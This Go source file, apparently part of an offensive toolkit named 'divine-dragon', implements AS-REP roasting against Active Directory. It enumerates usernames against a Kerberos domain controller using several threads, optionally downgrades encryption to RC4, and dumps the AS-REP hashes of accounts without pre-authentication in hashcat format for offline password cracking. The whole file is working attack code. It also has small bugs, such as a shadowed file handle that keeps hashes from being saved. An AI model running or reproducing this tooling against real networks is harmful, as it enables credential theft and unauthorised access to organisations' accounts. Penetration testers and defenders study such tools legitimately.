package remote_exploit

import (
	"bufio"
	"context"
	"divine-dragon/transport"
	"divine-dragon/util"
	"fmt"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ropnop/gokrb5/v8/messages"
)

var (
	domain       string
	dc           string
	verbose      bool
	safemode     bool
	downgrade    bool
	hashFile     *os.File
	usernamelist string

	kSession transport.KerberosSession
	kOptions transport.KerberosSessionOptions

	ctx, cancel = context.WithCancel(context.Background())
	threads     int
	delay       int
	counter     int32
	successes   int32

	logger util.Logger
)

func setupSession() bool {
	kOptions = transport.KerberosSessionOptions{
		Domain:           domain,
		DomainController: dc,
		Verbose:          verbose,
		SafeMode:         safemode,
		Downgrade:        downgrade,
	}
	k, err := transport.NewKerberosSession(kOptions)
	if err != nil {
		logger.Log.Error(err)
		return false
	}
	kSession = k

	logger.Log.Info("Using KDC(s):")
	for _, v := range kSession.Kdcs {
		logger.Log.Infof("\t%s\n", v)
	}

	return true
}

func SetupASREPRoastingModule(domain_opt string, dc_opt string, verbose_opt bool, safemode_opt bool,
	downgrade_opt bool, hashfilename_opt string, usernamelist_opt string, logFileName string, threads_opt int, delay_opt int) bool {
	domain = domain_opt
	dc = dc_opt
	verbose = verbose_opt
	safemode = safemode_opt
	downgrade = downgrade_opt
	usernamelist = usernamelist_opt

	delay = delay_opt
	if delay != 0 {
		threads = 1
		logger.Log.Infof("Delay set. Using single thread and delaying %dms between attempts\n", delay)
	} else {
		threads = threads_opt
	}
	logger = util.ASREPRoastingLogger(verbose, logFileName)
	if hashfilename_opt != "" {
		hashFile, err := os.OpenFile(hashfilename_opt, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			logger.Log.Errorf("Can't create a file for saving hashes - %v", err)
		}
		logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if downgrade {
			logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}
	status := setupSession()
	return status
}

func ASREPRoasting() {
	usersChan := make(chan string, threads)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if usernamelist != "-" {
		file, err := os.Open(usernamelist)
		if err != nil {
			// logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < threads; i++ {
		go makeASREPRoastingWorker(ctx, usersChan, &wg)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			break Scan
		default:
			usernameline := scanner.Text()
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				continue
			}
			time.Sleep(time.Duration(delay) * time.Millisecond)
			usersChan <- username
		}
	}
	close(usersChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d usernames (%d valid) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}
}

func makeASREPRoastingWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			doOneASREPRoasting(ctx, username)
		}
	}
}

func doOneASREPRoasting(ctx context.Context, username string) {
	atomic.AddInt32(&counter, 1)
	usernamefull := fmt.Sprintf("%v@%v", username, domain)
	valid, rb, err := kSession.TestUsername(username)
	if valid {
		atomic.AddInt32(&successes, 1)
		if rb != nil {
			// If no error, we actually got an AS REP, meaning user does not have pre-auth required
			var ASRep messages.ASRep
			err = ASRep.Unmarshal(rb)
			if err != nil {
				// something went wrong, it's not a valid response
				logger.Log.Errorf("[!] Invalid response: %v - %v", usernamefull, err)
			}
			DumpASRepHash(ASRep)
		} else {
			if err != nil {
				logger.Log.Infof("[-] VALID USERNAME WITH ERROR:\t %s\t (%s)", username, err)
			} else {
				logger.Log.Infof("[-] VALID USERNAME BUT WITH REQUIRED PRE AUTH:\t %s", usernamefull)
			}
		}
	} else if err != nil {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
			cancel()
		} else {
			logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
		}
	} else {
		logger.Log.Debug("[!] Unknown behavior - %v", usernamefull)
	}
}

func DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	// TODO:
	// Think about a way to save hash in temp file if filename was not specified.
	// Think about a way to run hashcat in a new process with proper command to crack the hashes
	// Maybe CLI will ask user to run hashcat...
	if err != nil {
		logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if hashFile != nil {
		_, err := hashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
